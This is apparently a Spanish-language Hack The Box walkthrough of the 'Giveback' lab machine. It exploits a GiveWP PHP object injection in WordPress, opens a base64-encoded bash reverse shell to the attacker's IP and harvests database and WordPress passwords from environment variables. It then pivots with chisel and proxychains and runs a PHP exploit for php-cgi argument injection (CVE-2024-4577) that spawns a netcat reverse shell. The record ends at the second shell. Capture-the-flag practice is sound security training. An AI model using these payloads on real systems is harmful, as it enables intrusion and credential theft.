# HTB: Giveback

## Host: Linux
## IP: 10.10.11.94

## Procedimiento y comandos
#### Paso 1: Enumeracion

Encontramos un sitio wordpres con un pluging **GiveWP** al cual la maquina hace referencia.

Buscamos por CVE y Exploits

[CVE](https://www.rcesecurity.com/2024/08/wordpress-givewp-pop-to-rce-cve-2024-5932/)

[Exploit](https://github.com/EQSTLab/CVE-2024-8353)

#### Paso 2: Acceso inicial

* Ejecutamos la prueba de concepto

```bash
python3 CVE-2024-8353.py -u http://giveback.htb -c "ping 10.10.15.196"
                                                                                                                                                                                                                                                                                                            
Analysis base : https://github.com/EQSTLab/CVE-2024-8353

=============================================================================================================    

CVE-2024-8353 : GiveWP unauthenticated PHP Object Injection
description: Donation Plugin and Fundraising Platform plugin for WordPress is vulnerable to PHP Object Injection in all versions up to, and including, 3.16.1 via deserialization of untrusted input via several parameters like 'give_title' and 'card_address'. This makes it possible for unauthenticated attackers to inject a PHP Object. The additional presence of a POP chain allows attackers to delete arbitrary files and achieve remote code execution. This is essentially the same vulnerability as CVE-2024-5932, however, it was discovered the the presence of stripslashes_deep on user_info allows the is_serialized check to be bypassed. This issue was mostly patched in 3.16.1, but further hardening was added in 3.16.2.

============================================================================================================= 
    
[\] Exploit loading, please wait...
[+] Donation Forms:
    17: The Things We Need
[+] Choose one (id) >>> 

```

* Vemos en tcpdump

```bash
tcpdump -i tun1 tcp    
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun1, link-type RAW (Raw IP), snapshot length 262144 bytes
18:58:40.791024 IP 10.10.15.196.49342 > giveback.htb.http: Flags [S], seq 305648394, win 64240, options [mss 1460,sackOK,TS val 2405710537 ecr 0,nop,wscale 7], length 0
18:58:41.789110 IP giveback.htb.http > 10.10.15.196.49342: Flags [S.], seq 1099946561, ack 305648395, win 64308, options [mss 1362,sackOK,TS val 3644043431 ecr 2405710537,nop,wscale 7], length 0
18:58:41.789162 IP 10.10.15.196.49342 > giveback.htb.http: Flags [.], ack 1, win 502, options [nop,nop,TS val 2405711535 ecr 3644043431], length 0
18:58:41.789325 IP 10.10.15.196.49342 > giveback.htb.http: Flags [P.], seq 1:237, ack 1, win 502, options [nop,nop,TS val 2405711535 ecr 3644043431], length 236: HTTP: POST /wp-admin/admin-ajax.php HTTP/1.1
18:58:41.789367 IP 10.10.15.196.49342 > giveback.htb.http: Flags [P.], seq 237:260, ack 1, win 502, options [nop,nop,TS val 2405711535 ecr 3644043431], length 23: HTTP
18:58:42.095973 IP giveback.htb.http > 10.10.15.196.49342: Flags [.], ack 237, win 501, options [nop,nop,TS val 3644043679 ecr 2405711535], length 0
18:58:42.096018 IP giveback.htb.http > 10.10.15.196.49342: Flags [.], ack 260, win 501, options [nop,nop,TS val 3644043679 ecr 2405711535], length 0
18:58:43.427214 IP giveback.htb.http > 10.10.15.196.49342: Flags [P.], seq 1:456, ack 260, win 501, options [nop,nop,TS val 3644045050 ecr 2405711535], length 455: HTTP: HTTP/1.1 200 OK
18:58:43.427255 IP 10.10.15.196.49342 > giveback.htb.http: Flags [.], ack 456, win 501, options [nop,nop,TS val 2405713173 ecr 3644045050], length 0
18:59:58.486511 IP giveback.htb.http > 10.10.15.196.49342: Flags [F.], seq 456, ack 260, win 501, options [nop,nop,TS val 3644120050 ecr 2405713173], length 0
18:59:58.529084 IP 10.10.15.196.49342 > giveback.htb.http: Flags [.], ack 457, win 501, options [nop,nop,TS val 2405788275 ecr 3644120050], length 0
```

* Ejecutamos penelope y obtenemos un shell

**Payload**

```bash
printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTUuMTk2LzQ0NDQgMD4mMSkgJg==|base64 -d|bash
```

**Ejecucion**

```bash
python3 CVE-2024-8353.py -u http://giveback.htb -c "printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTUuMTk2LzQ0NDQgMD4mMSkgJg==|base64 -d|bash"
```

**shell**

```bash
[+] Got reverse shell from beta-vino-wp-wordpress-565c644444-d5p8j~10.10.11.94-Linux-x86_64 üòç Assigned SessionID <1>
```
```bash
(Penelope)‚îÄ(Session [1])> interact 1
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /root/.penelope/sessions/beta-vino-wp-wordpress-565c644444-d5p8j~10.10.11.94-Linux-x86_64/2025_11_06-19_03_08-759.log üìú
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
whoami
whoami: cannot find name for user ID 1001
I have no name!@beta-vino-wp-wordpress-565c644444-d5p8j:/opt/bitnami/wordpress/wp-admin$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
I have no name!@beta-vino-wp-wordpress-565c644444-d5p8j:/opt/bitnami/wordpress/wp-admin$ 
```
* env

```bash
SHELL=/usr/bin/bash
KUBERNETES_SERVICE_PORT_HTTPS=443
BETA_VINO_WP_MARIADB_SERVICE_PORT=3306
WORDPRESS_SMTP_PASSWORD=
WORDPRESS_SMTP_FROM_EMAIL=
BETA_VINO_WP_WORDPRESS_PORT_443_TCP_PORT=443
WEB_SERVER_HTTP_PORT_NUMBER=8080
WORDPRESS_RESET_DATA_PERMISSIONS=no
KUBERNETES_SERVICE_PORT=443
WORDPRESS_EMAIL=user@example.com
WP_CLI_CONF_FILE=/opt/bitnami/wp-cli/conf/wp-cli.yml
WORDPRESS_DATABASE_HOST=beta-vino-wp-mariadb
MARIADB_PORT_NUMBER=3306
MODULE=wordpress
WORDPRESS_SMTP_FROM_NAME=FirstName LastName
HOSTNAME=beta-vino-wp-wordpress-565c644444-d5p8j
WORDPRESS_SMTP_PORT_NUMBER=
BETA_VINO_WP_MARIADB_PORT_3306_TCP_PROTO=tcp
WORDPRESS_EXTRA_CLI_ARGS=
APACHE_BASE_DIR=/opt/bitnami/apache
LEGACY_INTRANET_SERVICE_PORT_5000_TCP_PORT=5000
APACHE_VHOSTS_DIR=/opt/bitnami/apache/conf/vhosts
WEB_SERVER_DEFAULT_HTTP_PORT_NUMBER=8080
WP_NGINX_SERVICE_PORT_80_TCP=tcp://10.43.4.242:80
WORDPRESS_ENABLE_DATABASE_SSL=no
WP_NGINX_SERVICE_PORT_80_TCP_PROTO=tcp
APACHE_DAEMON_USER=daemon
BITNAMI_ROOT_DIR=/opt/bitnami
LEGACY_INTRANET_SERVICE_SERVICE_HOST=10.43.2.241
WORDPRESS_BASE_DIR=/opt/bitnami/wordpress
WORDPRESS_SCHEME=http
WORDPRESS_LOGGED_IN_SALT=
BETA_VINO_WP_WORDPRESS_PORT_80_TCP=tcp://10.43.61.204:80
WORDPRESS_DATA_TO_PERSIST=wp-config.php wp-content
WORDPRESS_HTACCESS_OVERRIDE_NONE=no
WORDPRESS_DATABASE_SSL_CERT_FILE=
APACHE_HTTPS_PORT_NUMBER=8443
PWD=/opt/bitnami/apache/conf
OS_FLAVOUR=debian-12
WORDPRESS_CONF_FILE=/opt/bitnami/wordpress/wp-config.php
WORDPRESS_SMTP_PROTOCOL=
LEGACY_INTRANET_SERVICE_PORT_5000_TCP=tcp://10.43.2.241:5000
WP_CLI_BASE_DIR=/opt/bitnami/wp-cli
WORDPRESS_VOLUME_DIR=/bitnami/wordpress
WP_CLI_CONF_DIR=/opt/bitnami/wp-cli/conf
APACHE_BIN_DIR=/opt/bitnami/apache/bin
BETA_VINO_WP_MARIADB_SERVICE_PORT_MYSQL=3306
WORDPRESS_PLUGINS=none
WORDPRESS_FIRST_NAME=FirstName
MARIADB_HOST=beta-vino-wp-mariadb
WORDPRESS_EXTRA_WP_CONFIG_CONTENT=
WORDPRESS_MULTISITE_ENABLE_NIP_IO_REDIRECTION=no
WORDPRESS_DATABASE_USER=bn_wordpress
PHP_DEFAULT_UPLOAD_MAX_FILESIZE=80M
WORDPRESS_AUTH_KEY=
BETA_VINO_WP_MARIADB_PORT_3306_TCP=tcp://10.43.147.82:3306
WORDPRESS_MULTISITE_NETWORK_TYPE=subdomain
WORDPRESS_DATABASE_SSL_KEY_FILE=
APACHE_DEFAULT_CONF_DIR=/opt/bitnami/apache/conf.default
WORDPRESS_LOGGED_IN_KEY=
APACHE_CONF_DIR=/opt/bitnami/apache/conf
HOME=/
KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443
WEB_SERVER_DAEMON_GROUP=daemon
PHP_DEFAULT_POST_MAX_SIZE=80M
WORDPRESS_ENABLE_HTTPS=no
BETA_VINO_WP_WORDPRESS_SERVICE_PORT=80
BETA_VINO_WP_WORDPRESS_SERVICE_PORT_HTTPS=443
WORDPRESS_TABLE_PREFIX=wp_
WORDPRESS_DATABASE_PORT_NUMBER=3306
WORDPRESS_DATABASE_NAME=bitnami_wordpress
LEGACY_INTRANET_SERVICE_SERVICE_PORT_HTTP=5000
APACHE_HTTP_PORT_NUMBER=8080
WP_NGINX_SERVICE_SERVICE_HOST=10.43.4.242
WP_NGINX_SERVICE_PORT=tcp://10.43.4.242:80
APACHE_DEFAULT_HTTP_PORT_NUMBER=8080
WP_CLI_DAEMON_GROUP=daemon
BETA_VINO_WP_MARIADB_PORT=tcp://10.43.147.82:3306
WORDPRESS_MULTISITE_FILEUPLOAD_MAXK=81920
WORDPRESS_AUTO_UPDATE_LEVEL=none
BITNAMI_DEBUG=false
LEGACY_INTRANET_SERVICE_SERVICE_PORT=5000
LEGACY_INTRANET_SERVICE_PORT_5000_TCP_ADDR=10.43.2.241
WORDPRESS_USERNAME=user
BETA_VINO_WP_WORDPRESS_PORT=tcp://10.43.61.204:80
WORDPRESS_ENABLE_XML_RPC=no
WORDPRESS_BLOG_NAME="User's Blog!"
APACHE_PID_FILE=/opt/bitnami/apache/var/run/httpd.pid
WP_NGINX_SERVICE_PORT_80_TCP_ADDR=10.43.4.242
WORDPRESS_AUTH_SALT=
APACHE_LOGS_DIR=/opt/bitnami/apache/logs
WORDPRESS_EXTRA_INSTALL_ARGS=
BETA_VINO_WP_MARIADB_PORT_3306_TCP_PORT=3306
APACHE_DAEMON_GROUP=daemon
WORDPRESS_NONCE_KEY=
WEB_SERVER_HTTPS_PORT_NUMBER=8443
WORDPRESS_SMTP_HOST=
WP_NGINX_SERVICE_SERVICE_PORT_HTTP=80
TERM=xterm-256color
APACHE_DEFAULT_HTTPS_PORT_NUMBER=8443
WORDPRESS_NONCE_SALT=
APACHE_CONF_FILE=/opt/bitnami/apache/conf/httpd.conf
WORDPRESS_MULTISITE_EXTERNAL_HTTP_PORT_NUMBER=80
BETA_VINO_WP_WORDPRESS_PORT_443_TCP=tcp://10.43.61.204:443
WEB_SERVER_DEFAULT_HTTPS_PORT_NUMBER=8443
WORDPRESS_LAST_NAME=LastName
WP_NGINX_SERVICE_SERVICE_PORT=80
WP_NGINX_SERVICE_PORT_80_TCP_PORT=80
WORDPRESS_ENABLE_MULTISITE=no
WORDPRESS_SKIP_BOOTSTRAP=no
WORDPRESS_MULTISITE_EXTERNAL_HTTPS_PORT_NUMBER=443
SHLVL=2
WORDPRESS_SECURE_AUTH_SALT=
BETA_VINO_WP_MARIADB_PORT_3306_TCP_ADDR=10.43.147.82
BITNAMI_VOLUME_DIR=/bitnami
BETA_VINO_WP_WORDPRESS_PORT_80_TCP_PORT=80
KUBERNETES_PORT_443_TCP_PROTO=tcp
BITNAMI_APP_NAME=wordpress
# Credencial Base de datos!
WORDPRESS_DATABASE_PASSWORD=sW5sp4spa3u7RLyetrekE4oS 
BETA_VINO_WP_WORDPRESS_SERVICE_HOST=10.43.61.204
APACHE_HTDOCS_DIR=/opt/bitnami/apache/htdocs
WEB_SERVER_GROUP=daemon
# Password wordpress
WORDPRESS_PASSWORD=O8F7KR5zGi
KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1
APACHE_HTACCESS_DIR=/opt/bitnami/apache/conf/vhosts/htaccess
WORDPRESS_DEFAULT_DATABASE_HOST=mariadb
WORDPRESS_SECURE_AUTH_KEY=
BETA_VINO_WP_WORDPRESS_PORT_443_TCP_PROTO=tcp
APACHE_TMP_DIR=/opt/bitnami/apache/var/run
APP_VERSION=6.8.1
BETA_VINO_WP_WORDPRESS_PORT_443_TCP_ADDR=10.43.61.204
ALLOW_EMPTY_PASSWORD=yes
WP_CLI_DAEMON_USER=daemon
BETA_VINO_WP_WORDPRESS_SERVICE_PORT_HTTP=80
KUBERNETES_SERVICE_HOST=10.43.0.1
KUBERNETES_PORT=tcp://10.43.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443
WP_CLI_BIN_DIR=/opt/bitnami/wp-cli/bin
WORDPRESS_VERIFY_DATABASE_SSL=yes
OS_NAME=linux
BETA_VINO_WP_WORDPRESS_PORT_80_TCP_PROTO=tcp
PATH=/opt/bitnami/apache/bin:/opt/bitnami/common/bin:/opt/bitnami/common/bin:/opt/bitnami/mysql/bin:/opt/bitnami/common/bin:/opt/bitnami/php/bin:/opt/bitnami/php/sbin:/opt/bitnami/apache/bin:/opt/bitnami/mysql/bin:/opt/bitnami/wp-cli/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
APACHE_SERVER_TOKENS=Prod
LEGACY_INTRANET_SERVICE_PORT_5000_TCP_PROTO=tcp
WORDPRESS_ENABLE_HTACCESS_PERSISTENCE=no
WORDPRESS_ENABLE_REVERSE_PROXY=no
LEGACY_INTRANET_SERVICE_PORT=tcp://10.43.2.241:5000
WORDPRESS_SMTP_USER=
WEB_SERVER_TYPE=apache
WORDPRESS_MULTISITE_HOST=
PHP_DEFAULT_MEMORY_LIMIT=512M
WORDPRESS_OVERRIDE_DATABASE_SETTINGS=no
WORDPRESS_DATABASE_SSL_CA_FILE=
OS_ARCH=amd64
WEB_SERVER_DAEMON_USER=daemon
OLDPWD=/opt/bitnami/wordpress/wp-admin
BETA_VINO_WP_WORDPRESS_PORT_80_TCP_ADDR=10.43.61.204
BETA_VINO_WP_MARIADB_SERVICE_HOST=10.43.147.82
_=/usr/bin/env
```
```bash
echo > /dev/tcp/10.43.147.82/3306 && echo "‚úÖ puerto 3306 abierto" || echo "‚ùå sin acceso"
# devuelve
‚úÖ puerto 3306 abierto
```

```bash
I have no name!@beta-vino-wp-wordpress-565c644444-d5p8j:/tmp$ which mysql || /opt/bitnami/mysql/bin/mysql --version 2>/dev/null || echo "mysql no encontrado"
/opt/bitnami/mysql/bin/mysql
I have no name!@beta-vino-wp-wordpress-565c644444-d5p8j:/tmp$ /opt/bitnami/mysql/bin/mysql -h 10.43.147.82 -u bn_wordpress -psW5sp4spa3u7RLyetrekE4oS -D bitnami_wordpress -e "SELECT ID,user_login,user_pass FROM wp_users LIMIT 100;"
/opt/bitnami/mysql/bin/mysql: Deprecated program name. It will be removed in a future release, use '/opt/bitnami/mysql/bin/mariadb' instead
+----+------------+-----------------------------------------------------------------+
| ID | user_login | user_pass                                                       |
+----+------------+-----------------------------------------------------------------+
|  1 | user       | $wp$2y$10$JdfYmrlB2AyklXkbmkofHuqRcCI3FPUrBQHpjg7wSK90tqmt3t7k2 |
+----+------------+-----------------------------------------------------------------+
```

| Servicio                  | IP           | Puerto | Descripci√≥n                    |
| ------------------------- | ------------ | ------ | ------------------------------ |
| `beta-vino-wp-mariadb`    | 10.43.147.82 | 3306   | Base de datos del WordPress    |
| `beta-vino-wp-wordpress`  | 10.43.61.204 | 80/443 | El propio contenedor del sitio |
| `legacy-intranet-service` | 10.43.2.241  | 5000   | Alg√∫n servicio interno legacy  |
| `wp-nginx-service`        | 10.43.4.242  | 80     | Proxy Nginx interno            |
| `kubernetes`              | 10.43.0.1    | 443    | API Server del cluster         |

* Credenciales obtenidas del env:

```bash
WORDPRESS_DATABASE_PASSWORD=sW5sp4spa3u7RLyetrekE4oS 
WORDPRESS_PASSWORD=O8F7KR5zGi
```

```bash
WORDPRESS_DATABASE_USER=bn_wordpress
WORDPRESS_DATABASE_PASSWORD=sW5sp4spa3u7RLyetrekE4oS
WORDPRESS_DATABASE_NAME=bitnami_wordpress
WORDPRESS_DATABASE_HOST=beta-vino-wp-mariadb
```
```bash
mysql -h 10.43.147.82 -u bn_wordpress -psW5sp4spa3u7RLyetrekE4oS -D bitnami_wordpress
mysql: Deprecated program name. It will be removed in a future release, use '/opt/bitnami/mysql/bin/mariadb' instead
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 42741
Server version: 11.4.3-MariaDB Source distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [bitnami_wordpress]> 
MariaDB [bitnami_wordpress]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| bitnami_wordpress  |
| information_schema |
+--------------------+
2 rows in set (0.002 sec)

MariaDB [bitnami_wordpress]> SHOW TABLES;
+-----------------------------+
| Tables_in_bitnami_wordpress |
+-----------------------------+
| wp_actionscheduler_actions  |
| wp_actionscheduler_claims   |
| wp_actionscheduler_groups   |
| wp_actionscheduler_logs     |
| wp_aioseo_cache             |
| wp_commentmeta              |
| wp_comments                 |
| wp_give_commentmeta         |
| wp_give_comments            |
| wp_give_donationmeta        |
| wp_give_donormeta           |
| wp_give_donors              |
| wp_give_formmeta            |
| wp_give_log                 |
| wp_give_migrations          |
| wp_give_revenue             |
| wp_give_sequential_ordering |
| wp_give_sessions            |
| wp_give_subscriptionmeta    |
| wp_give_subscriptions       |
| wp_links                    |
| wp_options                  |
| wp_postmeta                 |
| wp_posts                    |
| wp_term_relationships       |
| wp_term_taxonomy            |
| wp_termmeta                 |
| wp_terms                    |
| wp_usermeta                 |
| wp_users                    |
+-----------------------------+
30 rows in set (0.002 sec)

MariaDB [bitnami_wordpress]> SELECT * FROM wp_users;
+----+------------+-----------------------------------------------------------------+---------------+-------------------+------------------+---------------------+--------------------------------------------------------------+-------------+--------------+
| ID | user_login | user_pass                                                       | user_nicename | user_email        | user_url         | user_registered     | user_activation_key                                          | user_status | display_name |
+----+------------+-----------------------------------------------------------------+---------------+-------------------+------------------+---------------------+--------------------------------------------------------------+-------------+--------------+
|  1 | user       | $wp$2y$10$jMVv3uKzQTioFSycGK9HYu8LOgNM6PuVMWnkvPBZ4L6EKeXBSRpkm | user          | user@example.com  | http://127.0.0.1 | 2024-09-21 22:18:28 | 1762531178:$generic$GSIyzu8xUpeLnssoL5_2rd941u7IKLHslZEUQCds |           0 | babywyrm     |
|  2 | pwned      | $wp$2y$10$n5LZJ28fYSxSYV9g1kZpFemXIOQF.JsyBRYuoy8.BCdelb2dmm42e | pwned         | admin@example.com |                  | 2025-11-07 15:38:38 |                                                              |           0 | pwned        |
+----+------------+-----------------------------------------------------------------+---------------+-------------------+------------------+---------------------+--------------------------------------------------------------+-------------+--------------+
2 rows in set (0.004 sec)

MariaDB [bitnami_wordpress]> 
```
* Podemos hacer portforwarding con chisel para trabajar con mas conmodidad:

```bash
# Server
chisel server --port 9003 --reverse
2025/11/07 23:50:50 server: Reverse tunnelling enabled
2025/11/07 23:50:50 server: Fingerprint zVuHG0qooB3xaaVT++JqtcIZ0fsd6Jse1EKLt5HWRNo=
2025/11/07 23:50:50 server: Listening on http://0.0.0.0:9003
2025/11/07 23:53:48 server: session#1: Client version (1.10.1) differs from server version (1.10.1-0kali1)
2025/11/07 23:53:48 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```
```bash
# Client
I have no name!@beta-vino-wp-wordpress-7c4dfdc488-m4zvc:/tmp$ ./chisel client 10.10.15.196:9003 R:socks
2025/11/08 02:53:47 client: Connecting to ws://10.10.15.196:9003
2025/11/08 02:53:49 client: Connected (Latency 299.867848ms)
```
**Desde kali podemos**
```bash
proxychains mysql -h 10.43.147.82 -u bn_wordpress -psW5sp4spa3u7RLyetrekE4oS -D bitnami_wordpress
```
* **curl**
```bash
 proxychains curl http://10.43.2.241:5000                                                         
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.43.2.241:5000  ...  OK
<!DOCTYPE html>
<html>
<head>
  <title>GiveBack LLC Internal CMS</title>
  <!-- Developer note: phpinfo accessible via debug mode during migration window -->
  <style>
    body { font-family: Arial, sans-serif; margin: 40px; background: #f9f9f9; }
    .header { color: #333; border-bottom: 1px solid #ccc; padding-bottom: 10px; }
    .info { background: #eef; padding: 15px; margin: 20px 0; border-radius: 5px; }
    .warning { background: #fff3cd; border: 1px solid #ffeeba; padding: 10px; margin: 10px 0; }
    .resources { margin: 20px 0; }
    .resources li { margin: 5px 0; }
    a { color: #007bff; text-decoration: none; }
    a:hover { text-decoration: underline; }
  </style>
</head>
<body>
  <div class="header">
    <h1>üè¢ GiveBack LLC Internal CMS System</h1>
    <p><em>Development Environment ‚Äì Internal Use Only</em></p>
  </div>

  <div class="warning">
    <h4>‚ö†Ô∏è Legacy Notice</h4>
    <p>**SRE** - This system still includes legacy CGI support. Cluster misconfiguration may likely expose internal scripts.</p>
  </div>

  <div class="resources">
    <h3>Internal Resources</h3>
    <ul>
      <li><a href="/admin/">/admin/</a> ‚Äî VPN Required</li>
      <li><a href="/backups/">/backups/</a> ‚Äî VPN Required</li>
      <li><a href="/runbooks/">/runbooks/</a> ‚Äî VPN Required</li>
      <li><a href="/legacy-docs/">/legacy-docs/</a> ‚Äî VPN Required</li>
      <li><a href="/debug/">/debug/</a> ‚Äî Disabled</li>
      <li><a href="/cgi-bin/info">/cgi-bin/info</a> ‚Äî CGI Diagnostics</li>
      <li><a href="/cgi-bin/php-cgi">/cgi-bin/php-cgi</a> ‚Äî PHP-CGI Handler</li>
      <li><a href="/phpinfo.php">/phpinfo.php</a></li>
      <li><a href="/robots.txt">/robots.txt</a> ‚Äî Crawlers: Disallowed</li>
    </ul>
  </div>

  <div class="info">
    <h3>Developer Note</h3>
    <p>This CMS was originally deployed on Windows IIS using <code>php-cgi.exe</code>.
    During migration to Linux, the Windows-style CGI handling was retained to ensure
    legacy scripts continued to function without modification.</p>
  </div>
</body>
</html>
```
```bash
proxychains curl -v http://10.43.2.241:5000/cgi-bin/php-cgi
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
*   Trying 10.43.2.241:5000...
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.43.2.241:5000  ...  OK
* Connected to 10.43.2.241 (10.43.2.241) port 5000
* using HTTP/1.x
> GET /cgi-bin/php-cgi HTTP/1.1
> Host: 10.43.2.241:5000
> User-Agent: curl/8.15.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx/1.24.0
< Date: Sat, 08 Nov 2025 03:20:27 GMT
< Content-Type: text/plain;charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< X-Powered-By: PHP/8.3.3
< 
* Connection #0 to host 10.43.2.241 left intact
OK 
```
La vulnerabilidad en cuestion es CVE-2024-4577.
### Explicacion.. simple CGI injection

> Exploits

**Exploit - 1** Inestable requiere listener

```php
<?php

$target = "http://10.43.2.241:5000/cgi-bin/php-cgi";
$url = $target . "?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input";
$data = "echo `busybox nc 10.10.15.196 12345 -e sh`;";

$options = array(
    'http' => array(
        'method'  => 'POST',
        'header'  => 'Content-Type: application/x-www-form-urlencoded',
        'content' => $data
    )
);

$context_cmd = stream_context_create($options);
$result = file_get_contents($url, false, $context_cmd);
echo $result;
?>
```

* Ejecutamos desde Penelope:4444 el exploit para inyectar el cgi

```bash
# listener
penelope -p 12345              
[+] Listening for reverse shells on 0.0.0.0:12345 ‚Üí  127.0.0.1 ‚Ä¢ 192.168.1.5 ‚Ä¢ 192.168.45.188 ‚Ä¢ 172.17.0.1 ‚Ä¢ 10.10.15.196 ‚Ä¢ 192.168.1.34
‚û§  üè† Main Menu (m) üíÄ Payloads (p) üîÑ Clear (Ctrl-L) üö´ Quit (q/Ctrl-C)
[+] Got reverse shell from legacy-intranet-cms-6f7bf5db84-jm6bz~10.10.11.94-Linux-x86_64 üòç Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[!] Python agent cannot be deployed. I need to maintain at least one Raw session to handle the PTY
[+] Attempting to spawn a reverse shell on 10.10.15.196:12345
[+] Got reverse shell from legacy-intranet-cms-6f7bf5db84-jm6bz~10.10.11.94-Linux-x86_64 üòç Assigned SessionID <2>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/script! üí™
[+] Shell upgraded successfully using /usr/bin/script! üí™
[+] Interacting with session [2], Shell Type: PTY, Menu key: F12 
[+] Logging to /root/.penelope/sessions/legacy-intranet-cms-6f7bf5db84-jm6bz~10.10.11.94-Linux-x86_64/2025_11_07-17_02_00-093.log üìú
